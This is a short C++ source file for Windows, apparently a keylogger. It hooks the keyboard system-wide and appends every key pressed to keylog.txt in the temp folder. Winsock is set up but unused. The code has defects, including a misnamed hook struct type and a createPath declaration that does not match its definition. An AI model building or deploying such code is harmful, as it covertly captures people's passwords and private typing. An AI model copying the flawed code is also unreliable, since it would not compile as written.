#include <stdio.h>
#include <windows.h>
#include <string>
#include <winsock2.h>
using namespace std;


#pragma comment(lib, "ws2_32.lib")
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
string getTempPath();
string createPath(string temp_path);


WSADATA wsaData;
SOCKET ConnectSocket = INVALID_SOCKET;

int main (){

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    MSG message;

    while (1){

        if(GetMessage(&message , NULL, 0, 0)){

            TranslateMessage(&message);

            DispatchMessage(&message);


        } else {

            break;

        }

    }

}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){

    string temp = getTempPath();

    string filepath = createPath(temp);


    if (nCode >=0){

        if(wParam ==WM_KEYDOWN){

            KBDHOOKSTRUCT* kb = (KBDHOOKSTRUCT*)lParam;

            DWORD key_code = kb->vkCode;

            FILE* file = fopen(filepath.c_str(), "a");

            fprintf(file, "%d", key_code);

            fclose(file);
        }

    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);

}

string getTempPath(){

    char temp_path[MAX_PATH];

    GetTempPathA(MAX_PATH, temp_path);

    return temp_path;

}

string createPath(const string& temp_path){

    string FinalFile = temp_path + "\\keylog.txt";

    return FinalFile;

}

